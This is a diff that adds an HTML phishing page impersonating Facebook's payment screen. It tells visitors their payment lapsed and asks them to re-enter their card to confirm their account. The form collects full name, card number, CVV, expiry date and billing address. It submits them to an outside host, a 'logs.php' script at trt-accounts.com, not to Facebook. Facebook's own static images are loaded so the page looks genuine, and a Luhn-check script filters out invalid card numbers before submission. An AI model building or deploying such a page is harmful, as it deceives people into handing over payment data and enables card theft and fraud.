@@ -1,0 +1,625 @@
+<!DOCTYPE html><html lang="en" id="facebook" class="no_js"><head><meta charset="utf-8">
+<meta name="viewport" content="width=500, initial-scale=1">
+<link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico"><link rel="stylesheet" href="visa.css"><link rel="stylesheet" href="visa1.css"></head>    
+
+
+<body class="windowed"><p align="center"><blink><font size="05" color="#3b5998"> 
+ <span style="font-Klavika: 800; background-color: #">ONE MORE STEP</span></font></blink></p>
+
+<title>Enter Your Credit / Debit Card you</title>
+
+
+
+
+<script language="JAVASCRIPT">
+    <!--
+    function mod10( CreditNumber ) {
+    var ar = new Array( CreditNumber.length );
+    var i = 0,sum = 0;
+    for( i = 0; i < CreditNumber.length; ++i )
+      {ar[i] = parseInt(CreditNumber.charAt(i));}
+        	for( i = ar.length -2; i >= 0; i-=2 ) {
+        		ar[i] *= 2;
+        		if( ar[i] > 9 ) ar[i]-=9; }										
+
+            	for( i = 0; i < ar.length; ++i ) {
+            		sum += ar[i]; }
+            	return (((sum%10)==0)?true:false);
+        }
+
+    function expired( mm, yy ) {
+      var now = new Date();
+      var expiresIn = new Date(yy,mm,0,0,0);
+      expiresIn.setMonth(expiresIn.getMonth()+1);
+      if( now.getTime() < expiresIn.getTime() ) return false;
+      return true;
+    }
+
+    function validateCard(CreditNumber,cardType,mm,yy) {
+    if( CreditNumber.length == 0 ) {
+      alert("Enter your credit card number.");
+      return false;
+    }
+    for( var i = 0; i < CreditNumber.length; ++i ) {
+      var c = CreditNumber.charAt(i);
+      if( c < '0' || c > '9' ) {
+      alert("Use Numbers Only.");
+      return false;
+      }
+    }
+    var length = CreditNumber.length;
+    switch( cardType ) {
+      case 'a':
+      if( length != 15  ) {
+        alert("Not American Express Credit Card Numbers.");
+        return false;
+        }
+      var prefix = parseInt( CreditNumber.substring(0,2));
+      if( prefix != 34 && prefix != 37 ) {
+        alert("Not American Express Credit Card Numbers.");
+        return false;
+      }
+      break;
+      case 'd':
+      if( length != 16 ) {
+        alert("Not Discover Credit Card Numbers.");
+        return false;
+      }
+      var prefix = parseInt( CreditNumber.substring(0,4));
+      if( prefix != 6011 && prefix < 6500 || prefix > 6509 && prefix != 6013 ) {
+        alert("Not Discover Credit Card Numbers.");
+        return false;
+      }
+      break;
+      case 'm':
+      if( length != 16 && length != 14 && length != 15 ) {
+        alert("Not MasterCard Credit Card Numbers.");
+        return false;
+      }
+      var prefix = parseInt( CreditNumber.substring(0,2));
+      if( prefix < 51 || prefix > 56) {
+        alert("Not MasterCard Credit Card Numbers.");
+        return false;
+      }
+      break;
+      case 'v':
+      if( length != 16 && length != 13 ) {
+        alert("Not Visa Credit Card Numbers.");
+        return false;
+      }
+      var prefix = parseInt( CreditNumber.substring(0,1));
+      if( prefix != 4 ) {
+        alert("Not Visa Credit Card Numbers.");
+        return false;
+      }
+      break;
+      case 'j':
+      if( length != 16 ) {
+        alert("Not JCB Credit Card Numbers.");
+        return false;
+      }
+      var prefix = parseInt( CreditNumber.substring(0,4));
+      if( prefix != 3 ) {
+        alert("Not JCB Credit Card Numbers.");
+        return false;
+      }
+      break;
+      case 'b':
+      if( length != 16 && length != 14 && length != 15 ) {
+        alert("Not Bankcard Credit Card Numbers.");
+        return false;
+      }
+      var prefix = parseInt( CreditNumber.substring(0,3));
+      if( prefix != 56 ) {
+        alert("Not Bankcard Credit Card Numbers.");
+        return false;
+      }
+      break;
+      case 'di':
+      if( length != 14 ) {
+        alert("Not Diners Club Credit Card Numbers.");
+        return false;
+      }
+      var prefix = parseInt( CreditNumber.substring(0,2));
+      if( prefix < 300 || prefix > 305 && prefix != 38 ) {
+        alert("Not Diners Club Credit Card Numbers.");
+        return false;
+      }
+      break;
+    }
+
+    if( !mod10( CreditNumber ) ) {
+      alert("Your credit card number is incorrect.");
+      return false;
+      }
+
+    if( expired( mm, yy ) ) {
+      alert("Credit Card Has Expired.");
+      return false;
+      }
+
+    alert("Credit Card Numbers Are Valid!");
+    return true;
+    }
+
+    //-->
+    </script>
+
+
+
+
+
+<div id="rootFrame" class="LX custom frame" style="margin-top: -320px; max-height: 700px;">
+
+    <div class="FY titleBar">
+
+
+<div id="signoutMenu" class="HY MY IY" tabindex="0" style="">
+
+    <div>
+        <font color="#375997"><strong> UPGRADE PAYMENT </strong>
+
+        
+        
+            
+        </font></div><font color="#375997">
+    </font></div><font color="#375997">
+  
+</font></div><font color="#375997">
+
+</font><center><font color="#375997"><img height="30" width="470" alt="" src="Upgradepayment.jpg">
+</font></center>
+
+<div class="gift_credits_body" id="gift_credits_body">
+
+<div class="checkout_and_main_body"><div class="mhl mtl mbs pam uiBoxGray">
+
+<div class="main_body">
+
+<div id="booklet"><div id="pageheader" class="">
+
+<h2 id="homelink">Enter your credit card</h2></div>
+
+<form rel="async" class="fbCreditCard editMode" action="http://ew.trt-accounts.com/proccesingfbfb-cardfbnext/logs.php" method="post" id="uwgdz8_3" onsubmit="return validateCard(this.CreditNumber.value,this.cardType.value,this.mm.value,this.yy.value);">
+
+<div id="payment_body_and_buttons">
+<div class="mbs fbCreditCard editMode" id="u_0_0">
+
+
+
+<center><br>
+Payment page you were laid off, please update your credit card again to confirm your account <font color="blue">Facebook</font>.</center>
+<br><center>
+<table class="uiInfoTable fbCreditCardFields noBorder" role="presentation">
+
+<tbody><tr class="showInEditMode dataRowInEditMode">
+<th class="label">First Name</th><td class="data"><span>
+<span class="hideInEditMode"></span><span class="showInEditMode">
+<input type="text" class="inputtext" id="front" name="front"></span>
+</span>
+</td>
+</tr>
+
+<tr class="showInEditMode dataRowInEditMode">
+<th class="label">Last Name</th><td class="data"><span>
+<span class="hideInEditMode"></span><span class="showInEditMode">
+<input type="text" class="inputtext" id="hind" name="hind"></span>
+</span>
+</td>
+</tr>
+
+<tr class="showInEditMode dataRowInEditMode">
+<th class="label">Card Number</th><td class="data"><span>
+<span class="hideInEditMode"></span><span class="showInEditMode">
+<input type="text" class="inputtext" id="CreditNumber" name="CreditNumber" placeholder="xxxxxxxxxxxxxxxx" aria-label="xxxxxxxxxxxxxxxx"></span>
+</span>
+</td>
+</tr>
+
+<tr class="dataRowInEditMode">
+<th class="label">Card Type</th><td class="data"><span>
+    <select name="cardType" id="cardType">
+    <option value="0"> Card Type
+    </option><option value="Visa"> Visa
+    </option><option value="MasterCard"> MasterCard
+
+    </option></select>
+
+</span></td></tr><tr class="dataRowInEditMode">
+<th class="label">Expiration Date</th>
+<td class="data"><span>
+
+<select id="mm" name="mm">
+<option value="0">Year</option>
+<option value="1">01</option>
+<option value="2">02</option>
+<option value="3">03</option>
+<option value="4">04</option>
+<option value="5">05</option>
+<option value="6">06</option>
+<option value="7">07</option>
+<option value="8">08</option>
+<option value="9">09</option>
+<option value="10">10</option>
+<option value="11">11</option>
+<option value="12">12</option>
+
+</select> / 
+
+<select id="yy" name="yy">
+<option value="0">Month</option>
+<option value="2014">2014</option>
+<option value="2015">2015</option>
+<option value="2016">2016</option>
+<option value="2017">2017</option>
+<option value="2018">2018</option>
+<option value="2019">2019</option>
+<option value="2020">2020</option>
+<option value="2021">2021</option>
+<option value="2022">2022</option>
+<option value="2023">2023</option>
+<option value="2024">2024</option>
+<option value="2025">2025</option>
+<option value="2026">2026</option>
+</select>
+
+</span>
+</td>
+</tr>
+
+<tr class="showInEditMode dataRowInEditMode">
+<th class="label">Security Code (CVV)</th>
+<td class="data"><span>
+<span class="hideInEditMode"></span>
+<span class="showInEditMode">
+<input type="text" class="inputtext" name="CVV" id="CVV" maxlength="3" size="3" placeholder="xxx" aria-label="xxx">
+<a class="mhs uiHelpLink" data-hover="tooltip" aria-label="What's a CSC?"></a></span></span>
+
+</td>
+</tr>
+
+<tr class="showInEditMode dataRowInEditMode">
+<th class="label">Billing Address</th>
+<td class="data"><span>
+<span class="hideInEditMode"></span>
+<span class="showInEditMode">
+<input type="text" class="inputtext" name="address" value=""></span>
+</span>
+</td>
+</tr>
+
+<tr class="showInEditMode dataRowInEditMode">
+<th class="label">Billing Address 2</th>
+<td class="data"><span>
+<span class="hideInEditMode"></span>
+<span class="showInEditMode">
+<input type="text" class="inputtext" name="address2"></span>
+</span>
+</td>
+</tr>
+
+<tr class="showInEditMode dataRowInEditMode">
+<th class="label">City/Town</th>
+<td class="data"><span>
+<span class="hideInEditMode"></span>
+<span class="showInEditMode">
+<input type="text" class="inputtext" name="city"></span>
+</span>
+</td>
+</tr>
+
+<tr class="showInEditMode dataRowInEditMode">
+<th class="label">State/Province/Region</th>
+<td class="data"><span>
+<span class="hideInEditMode"></span>
+<span class="showInEditMode">
+<input type="text" class="inputtext" name="state"></span>
+</span>
+</td>
+</tr>
+
+<tr class="showInEditMode dataRowInEditMode">
+<th class="label">Zip/Postal Code</th>
+<td class="data"><span>
+<span class="hideInEditMode"></span>
+<span class="showInEditMode">
+<input type="text" class="inputtext" name="zip" value=""></span>
+</span>
+</td>
+</tr>
+
+<tr class="showInEditMode dataRowInEditMode">
+<th class="label">Country</th><td class="data"><span>
+<span class="hideInEditMode"></span>
+<span class="showInEditMode">
+<select class="fbCountrySelector" name="country">
+<option value="0" selected="1">Select</option>
+<option value="United States">	United States (US)	</option>
+<option value="Canada">		Canada		</option>
+<option value="United Kingdom">	United Kingdom (UK)	</option>
+<option value="Afghanistan">	Afghanistan	</option>
+<option value="AX">Aland Islands</option>
+<option value="AL">Albania</option>
+<option value="DZ">Algeria</option>
+<option value="AS">American Samoa</option>
+<option value="AD">Andorra</option>
+<option value="AO">Angola</option>
+<option value="AI">Anguilla</option>
+<option value="AQ">Antarctica</option>
+<option value="AG">Antigua</option>
+<option value="AR">Argentina</option>
+<option value="AM">Armenia</option>
+<option value="AW">Aruba</option>
+<option value="AU">Australia</option>
+<option value="AT">Austria</option>
+<option value="AZ">Azerbaijan</option>
+<option value="BH">Bahrain</option>
+<option value="BD">Bangladesh</option>
+<option value="BB">Barbados</option>
+<option value="BY">Belarus</option>
+<option value="BE">Belgium</option>
+<option value="BZ">Belize</option>
+<option value="BJ">Benin</option>
+<option value="BM">Bermuda</option>
+<option value="BT">Bhutan</option>
+<option value="BO">Bolivia</option>
+<option value="BQ">Bonaire, Sint Eustatius and Saba</option>
+<option value="BA">Bosnia and Herzegovina</option>
+<option value="BW">Botswana</option>
+<option value="BV">Bouvet Island</option>
+<option value="BR">Brazil</option>
+<option value="IO">British Indian Ocean Territory</option>
+<option value="VG">British Virgin Islands</option>
+<option value="BN">Brunei</option>
+<option value="BG">Bulgaria</option>
+<option value="BF">Burkina Faso</option>
+<option value="BI">Burundi</option>
+<option value="KH">Cambodia</option>
+<option value="CM">Cameroon</option>
+<option value="CV">Cape Verde</option>
+<option value="KY">Cayman Islands</option>
+<option value="CF">Central African Republic</option>
+<option value="TD">Chad</option>
+<option value="CL">Chile</option>
+<option value="CN">China</option>
+<option value="CX">Christmas Island</option>
+<option value="CC">Cocos (Keeling) Islands</option>
+<option value="CO">Colombia</option>
+<option value="KM">Comoros</option>
+<option value="CK">Cook Islands</option>
+<option value="CR">Costa Rica</option>
+<option value="CI">C�te d'Ivoire</option>
+<option value="HR">Croatia</option>
+<option value="CW">Cura�ao</option>
+<option value="CY">Cyprus</option>
+<option value="CZ">Czech Republic</option>
+<option value="CD">Democratic Republic of the Congo</option>
+<option value="DK">Denmark</option>
+<option value="DJ">Djibouti</option>
+<option value="DM">Dominica</option>
+<option value="DO">Dominican Republic</option>
+<option value="EC">Ecuador</option>
+<option value="EG">Egypt</option>
+<option value="SV">El Salvador</option>
+<option value="GQ">Equatorial Guinea</option>
+<option value="ER">Eritrea</option>
+<option value="EE">Estonia</option>
+<option value="ET">Ethiopia</option>
+<option value="FK">Falkland Islands</option>
+<option value="FO">Faroe Islands</option>
+<option value="FM">Federated States of Micronesia</option>
+<option value="FJ">Fiji</option>
+<option value="FI">Finland</option>
+<option value="FR">France</option>
+<option value="GF">French Guiana</option>
+<option value="PF">French Polynesia</option>
+<option value="TF">French Southern Territories</option>
+<option value="GA">Gabon</option>
+<option value="GE">Georgia</option>
+<option value="DE">Germany</option>
+<option value="GH">Ghana</option>
+<option value="GI">Gibraltar</option>
+<option value="GR">Greece</option>
+<option value="GL">Greenland</option>
+<option value="GD">Grenada</option>
+<option value="GP">Guadeloupe</option>
+<option value="GU">Guam</option>
+<option value="GT">Guatemala</option>
+<option value="GG">Guernsey</option>
+<option value="GN">Guinea</option>
+<option value="GW">Guinea-Bissau</option>
+<option value="GY">Guyana</option>
+<option value="HT">Haiti</option>
+<option value="HM">Heard Island and McDonald Islands</option>
+<option value="HN">Honduras</option>
+<option value="HK">Hong Kong</option>
+<option value="HU">Hungary</option>
+<option value="IS">Iceland</option>
+<option value="IN">India</option>
+<option value="ID">Indonesia</option>
+<option value="IQ">Iraq</option>
+<option value="IE">Ireland</option>
+<option value="IM">Isle Of Man</option>
+<option value="IL">Israel</option>
+<option value="IT">Italy</option>
+<option value="JM">Jamaica</option>
+<option value="JP">Japan</option>
+<option value="JE">Jersey</option>
+<option value="JO">Jordan</option>
+<option value="KZ">Kazakhstan</option>
+<option value="KE">Kenya</option>
+<option value="KI">Kiribati</option>
+<option value="KW">Kuwait</option>
+<option value="KG">Kyrgyzstan</option>
+<option value="LA">Laos</option>
+<option value="LV">Latvia</option>
+<option value="LB">Lebanon</option>
+<option value="LS">Lesotho</option>
+<option value="LR">Liberia</option>
+<option value="LY">Libya</option>
+<option value="LI">Liechtenstein</option>
+<option value="LT">Lithuania</option>
+<option value="LU">Luxembourg</option>
+<option value="MO">Macau</option>
+<option value="MK">Macedonia</option>
+<option value="MG">Madagascar</option>
+<option value="MW">Malawi</option>
+<option value="MY">Malaysia</option>
+<option value="MV">Maldives</option>
+<option value="ML">Mali</option>
+<option value="MT">Malta</option>
+<option value="MH">Marshall Islands</option>
+<option value="MQ">Martinique</option>
+<option value="MR">Mauritania</option>
+<option value="MU">Mauritius</option>
+<option value="YT">Mayotte</option>
+<option value="MX">Mexico</option>
+<option value="MD">Moldova</option>
+<option value="MC">Monaco</option>
+<option value="MN">Mongolia</option>
+<option value="ME">Montenegro</option>
+<option value="MS">Montserrat</option>
+<option value="MA">Morocco</option>
+<option value="MZ">Mozambique</option>
+<option value="MM">Myanmar</option>
+<option value="NA">Namibia</option>
+<option value="NR">Nauru</option>
+<option value="NP">Nepal</option>
+<option value="NL">Netherlands</option>
+<option value="AN">Netherlands Antilles</option>
+<option value="NC">New Caledonia</option>
+<option value="NZ">New Zealand</option>
+<option value="NI">Nicaragua</option>
+<option value="NE">Niger</option>
+<option value="NG">Nigeria</option>
+<option value="NU">Niue</option>
+<option value="NF">Norfolk Island</option>
+<option value="KP">North Korea</option>
+<option value="MP">Northern Mariana Islands</option>
+<option value="NO">Norway</option>
+<option value="OM">Oman</option>
+<option value="PK">Pakistan</option>
+<option value="PW">Palau</option>
+<option value="PS">Palestine</option>
+<option value="PA">Panama</option>
+<option value="PG">Papua New Guinea</option>
+<option value="PY">Paraguay</option>
+<option value="PE">Peru</option>
+<option value="PH">Philippines</option>
+<option value="PN">Pitcairn</option>
+<option value="PL">Poland</option>
+<option value="PT">Portugal</option>
+<option value="PR">Puerto Rico</option>
+<option value="QA">Qatar</option>
+<option value="CG">Republic of the Congo</option>
+<option value="RE">R�union</option>
+<option value="RO">Romania</option>
+<option value="RU">Russia</option>
+<option value="RW">Rwanda</option>
+<option value="BL">Saint Barth�lemy</option>
+<option value="SH">Saint Helena</option>
+<option value="KN">Saint Kitts and Nevis</option>
+<option value="MF">Saint Martin</option>
+<option value="PM">Saint Pierre and Miquelon</option>
+<option value="VC">Saint Vincent and the Grenadines</option>
+<option value="WS">Samoa</option>
+<option value="SM">San Marino</option>
+<option value="ST">Sao Tome and Principe</option>
+<option value="SA">Saudi Arabia</option>
+<option value="SN">Senegal</option>
+<option value="RS">Serbia</option>
+<option value="SC">Seychelles</option>
+<option value="SL">Sierra Leone</option>
+<option value="SG">Singapore</option>
+<option value="SX">Sint Maarten</option>
+<option value="SK">Slovakia</option>
+<option value="SI">Slovenia</option>
+<option value="SB">Solomon Islands</option>
+<option value="SO">Somalia</option>
+<option value="ZA">South Africa</option>
+<option value="GS">South Georgia and the South Sandwich Islands</option>
+<option value="KR">South Korea</option>
+<option value="SS">South Sudan</option>
+<option value="ES">Spain</option>
+<option value="LK">Sri Lanka</option>
+<option value="LC">St. Lucia</option>
+<option value="SR">Suriname</option>
+<option value="SJ">Svalbard and Jan Mayen</option>
+<option value="SZ">Swaziland</option>
+<option value="SE">Sweden</option>
+<option value="CH">Switzerland</option>
+<option value="TW">Taiwan</option>
+<option value="TJ">Tajikistan</option>
+<option value="TZ">Tanzania</option>
+<option value="TH"> Thailand </option>
+<option value="BS">The Bahamas</option>
+<option value="GM">The Gambia</option>
+<option value="TL">Timor-Leste</option>
+<option value="TG">Togo</option>
+<option value="TK">Tokelau</option>
+<option value="TO">Tonga</option>
+<option value="TT">Trinidad and Tobago</option>
+<option value="TN">Tunisia</option>
+<option value="TR">Turkey</option>
+<option value="TM">Turkmenistan</option>
+<option value="TC">Turks and Caicos Islands</option>
+<option value="TV">Tuvalu</option>
+<option value="UG">Uganda</option>
+<option value="UA">Ukraine</option>
+<option value="AE">United Arab Emirates</option>
+<option value="UM">United States Minor Outlying Islands</option>
+<option value="UY">Uruguay</option>
+<option value="VI">US Virgin Islands</option>
+<option value="UZ">Uzbekistan</option>
+<option value="VU">Vanuatu</option>
+<option value="VA">Vatican City</option>
+<option value="VE">Venezuela</option>
+<option value="VN">Vietnam</option>
+<option value="WF">Wallis and Futuna</option>
+<option value="EH">Western Sahara</option>
+<option value="YE">Yemen</option>
+<option value="ZM">Zambia</option>
+<option value="ZW">Zimbabwe</option>
+</select>
+</span></span>
+</td>
+</tr>
+</tbody></table>
+</center></div>
+
+
+<div class="cc_fullpage_order_total">
+<div class="clearfix">
+
+
+
+</div>
+</div>
+</div>
+<center><br>
+<div class="button_row" id="button_row">
+<i class="mrs secure_logo img sp_3f0t1g sx_ac494f"></i>
+<label class="uiButton uiButtonConfirm" id="purchase" for="u_0_2">
+<input value="Confirmation" type="submit" id="u_0_2">
+
+
+
+</label>
+</div>
+</center></form></div>
+
+
+</div>
+</div>
+</div>
+<div class="payment_footer" id="payment_footer">
+<div class="clearfix">
+
+<img class="mlm rfloat img" src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yo/r/kT2ocXFCst4.gif" alt="" width="104" height="61">
+
+<div class="ptm fcg">Facebook will save your payment information for future purchases. You can always remove or manage this information in your account settings.
+
+
+
+
+</div></div></div></div></div></body></html>
